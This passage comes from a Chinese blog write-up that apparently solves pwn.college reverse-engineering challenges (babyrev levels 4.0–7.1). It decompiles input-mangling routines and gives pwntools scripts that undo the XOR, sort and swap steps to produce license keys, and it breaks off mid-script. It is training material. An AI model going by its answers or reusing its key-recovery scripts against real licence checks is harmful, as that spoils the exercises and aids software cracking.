<p>然后，<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107213541957.png" srcset="/img/loading.gif" lazyload class="" title="image-20241107213541957"></p>
<p>最后输入<code>ruhsi</code>即可。</p>
<h4 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">Initial</span> input:<br><br>        <span class="hljs-attribute">71</span> <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>a <br><br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `sort` mangler.<br><br><span class="hljs-attribute">This</span> mangled your input, resulting in:<br><br>        <span class="hljs-attribute">0a</span> <span class="hljs-number">69</span> <span class="hljs-number">71</span> <span class="hljs-number">74</span> <span class="hljs-number">75</span><br></code></pre></td></tr></table></figure>

<p>最后一个字节，去了第一个位置。第三个字节去了第二个位置，第一个字节去了第三个位置，第四个位置没动，第二个字节去了第五个位置。</p>
<p><code>66 71 72 77 78</code>，这是期待的字符串，也就是<code>fqrwx</code></p>
<p>最后输入<code>xrfwq</code>即可。</p>
<p>qfxwr</p>
<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h4><p>这道题也是一样的，按照上面的逻辑进行翻转。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">3</span>; ++i )<br> &#123;<br>   <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span> - i; ++j )<br>   &#123;<br>     <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;buf + j) &gt; *((_BYTE *)&amp;buf + j + <span class="hljs-number">1</span>) )<br>     &#123;<br>       v3 = *((_BYTE *)&amp;buf + j);<br>       *((_BYTE *)&amp;buf + j) = *((_BYTE *)&amp;buf + j + <span class="hljs-number">1</span>);<br>       *((_BYTE *)&amp;buf + j + <span class="hljs-number">1</span>) = v3;<br>     &#125;<br>   &#125;<br> &#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>分析一下，i &#x3D; 0 的情况下，j由0到3，前五个字节。那么这里会有一个判断，即将ascii值最大的字节放至第5个位置；i &#x3D; 1的情况下，j由0到2，前4个字节。将ascii值最大的字节放至第4个位置。以此类推。这是冒泡排序，对前5个字节进行冒泡排序。将ascii码值由小到大排序。</p>
</blockquote>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107214343087.png" srcset="/img/loading.gif" lazyload class="" title="image-20241107214343087">



<p>最后输入<code>almrv的任意排序</code>即可。因此，我在level4.0发现的规律是错误的。</p>
<h4 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h4><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb7</code></p>
<p>与0xb7异或。异或的操作是可逆的，那么再异或回去就好了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0xc3</span> ^ <span class="hljs-number">0xb7</span><br><span class="hljs-number">116</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xc3</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x74&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xc2</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x75&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xdf</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x68&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xc7</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x70&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">0xc4</span> ^ <span class="hljs-number">0xb7</span>)<br><span class="hljs-string">&#x27;0x73&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure>

<p>用python终端，即可。最终输入<code>tuhps</code>即可。</p>
<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    *((_BYTE *)&amp;buf + i) ^= <span class="hljs-number">0x41u</span>;<br></code></pre></td></tr></table></figure>

<p>异或的字节为0x41，目标字符串是<code>.data:0000000000004010 a056            db &#39;0&#39;,27h,27h,&#39;56&#39;,0</code></p>
<p>异或一下。最终输入<code>qfftw</code>即可。</p>
<h4 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h4><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xbf46</code></p>
<p>This challenge is now mangling your input using the <code>sort</code> mangler.</p>
<p>This challenge is now mangling your input using the <code>swap</code> mangler for indexes <code>0</code> and <code>9</code>.</p>
<p>强度一下就上来啦，xor，sort和swap三种方法。</p>
<p>目标</p>
<p>字符串为：<code>cd 20 25 27 27 28 31 35 c8 20 ce cf d1 d5 d9 dc</code>，写个脚本跑就好了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level6.0&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x20</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x25</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xd1</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0xdc</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># xor</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(hex_string) - <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i] ^ <span class="hljs-number">0xbf</span>)<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i+<span class="hljs-number">1</span>] ^ <span class="hljs-number">0x46</span>)<br><br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure>

<blockquote>
<p>因为有sort的关系，并且最终的结果也确实sort后swap就能达到。因此只需要将目标字符串从小到大排序后，异或0xbf46即可。</p>
</blockquote>
<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6.1"></a>level6.1</h4><p><strong><img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241108212052627.png" srcset="/img/loading.gif" lazyload class="" title="image-20241108212052627"></strong></p>
<p>目标字符串为<code>0x80, 0xD8, 0x4E, 0xC7, 0X99, 0x0B, 0x8B, 0xC8, 0x45, 0xC0, 0x86, 0x06, 0x84, 0xC2, 0x5F, 0xD6, 0x82, 0x03, 0x83</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">18</span>; ++i )<br>&#123;<br>  v3 = i % <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">if</span> ( i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span> )<br>  &#123;<br>    *((_BYTE *)buf + i) ^= <span class="hljs-number">0xEBu</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v3 )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>        *((_BYTE *)buf + i) ^= <span class="hljs-number">0x37u</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      *((_BYTE *)buf + i) ^= <span class="hljs-number">0xF1u</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">8</span>; ++j )<br>&#123;<br>  v4 = *((_BYTE *)buf + j);<br>  *((_BYTE *)buf + j) = *((_BYTE *)buf + <span class="hljs-number">18</span> - j);<br>  *((_BYTE *)buf + <span class="hljs-number">18</span> - j) = v4;<br>&#125;<br><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">18</span>; ++k )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( k % <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( k % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )<br>      *((_BYTE *)buf + k) ^= <span class="hljs-number">0x46u</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *((_BYTE *)buf + k) ^= <span class="hljs-number">0x1Du</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>最终脚本为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level6.1&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x80</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0X99</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x83</span>]<br><span class="hljs-comment"># 0x80, 0xD8, 0x4E, 0xC7, 0X99, 0x0B, 0x8B, 0xC8, 0x45, 0xC0, 0x86, 0x06, 0x84, 0xC2, 0x5F, 0xD6, 0x82, 0x03, 0x83</span><br>payload=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># xor</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x46</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x1d</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    temp = hex_string[i]<br>    hex_string[i] = hex_string[<span class="hljs-number">18</span> - i]<br>    hex_string[<span class="hljs-number">18</span> - i] = temp<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xeb</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x37</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xf1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure>

<p>逆序进行即可。还是比较简单的。</p>
<h4 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">This</span> challenge is now mangling your input using the `sort` mangler.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">16</span>` and `<span class="hljs-number">21</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">9</span>` and `<span class="hljs-number">22</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">3</span>` and `<span class="hljs-number">6</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `reverse` mangler.<br><span class="hljs-attribute">Expected</span> result:<br><br>        <span class="hljs-attribute">79</span> <span class="hljs-number">78</span> <span class="hljs-number">78</span> <span class="hljs-number">68</span> <span class="hljs-number">72</span> <span class="hljs-number">73</span> <span class="hljs-number">72</span> <span class="hljs-number">72</span> <span class="hljs-number">72</span> <span class="hljs-number">74</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>f <span class="hljs-number">6</span>f <span class="hljs-number">6</span>d <span class="hljs-number">6</span>c <span class="hljs-number">6</span>a <span class="hljs-number">77</span> <span class="hljs-number">67</span> <span class="hljs-number">65</span> <span class="hljs-number">62</span> <span class="hljs-number">64</span> <span class="hljs-number">62</span> <span class="hljs-number">64</span> <span class="hljs-number">61</span> <span class="hljs-number">61</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level7.0&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x65</span> ,<span class="hljs-number">0x62</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x61</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure>

<p>因为sort在第一个的关系，因此实际上我们需要的是找到expected result即可。</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// swap  </span><br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>  &#123;<br>    v6 = *((_BYTE *)&amp;buf + i);<br>    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="hljs-number">28</span> - i);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">28</span> - i) = v6;<br>  &#125;<br><span class="hljs-comment">//sort</span><br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">27</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">28</span> - j; ++k )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;buf + k) &gt; *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>) )<br>      &#123;<br>        v5 = *((_BYTE *)&amp;buf + k);<br>        *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>);<br>        *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>) = v5;<br>      &#125;<br>    &#125;<br>  &#125;<br><span class="hljs-comment">// swap</span><br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">13</span>; ++m )<br>  &#123;<br>    v4 = *((_BYTE *)&amp;buf + m);<br>    *((_BYTE *)&amp;buf + m) = *((_BYTE *)&amp;buf + <span class="hljs-number">28</span> - m);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">28</span> - m) = v4;<br>  &#125;<br><span class="hljs-comment">// switch</span><br>  <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">28</span>; ++n )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( n % <span class="hljs-number">5</span> )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x75u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x7Eu</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">1u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x3Du</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0xC5u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-题解/image-20241110102042920.png" srcset="/img/loading.gif" lazyload  alt="image-20241110102042920" style="zoom:67%;" />

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x0f</span>, <span class="hljs-number">0</span>x04, <span class="hljs-number">0</span>x7b, <span class="hljs-number">0</span>x47, <span class="hljs-number">0</span>xbf, <span class="hljs-number">0</span>x0c, <span class="hljs-number">0</span>x06, <span class="hljs-number">0</span>x79, <span class="hljs-number">0</span>x4a, <span class="hljs-number">0</span>xb0, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>x0d, <span class="hljs-number">0</span>x70, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>xaa, <span class="hljs-number">0</span>x18, <span class="hljs-number">0</span>x12, <span class="hljs-number">0</span>x6a, <span class="hljs-number">0</span>x56, <span class="hljs-number">0</span>xae, <span class="hljs-number">0</span>x1f, <span class="hljs-number">0</span>x16, <span class="hljs-number">0</span>x67, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>xa6, <span class="hljs-number">0</span>x16, <span class="hljs-number">0</span>x1c, <span class="hljs-number">0</span>x63, <span class="hljs-number">0</span>x5c<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level7.1&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x0f</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x5c</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># xor</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">29</span>):<br>    d = i % <span class="hljs-number">5</span><br>    <span class="hljs-keyword">if</span> d == <span class="hljs-number">0</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x75</span><br>    <span class="hljs-keyword">elif</span> d == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x7e</span><br>    <span class="hljs-keyword">elif</span> d == <span class="hljs-number">2</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x01</span><br>    <span class="hljs-keyword">elif</span> d == <span class="hljs-number">3</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x3d</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xc5</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span 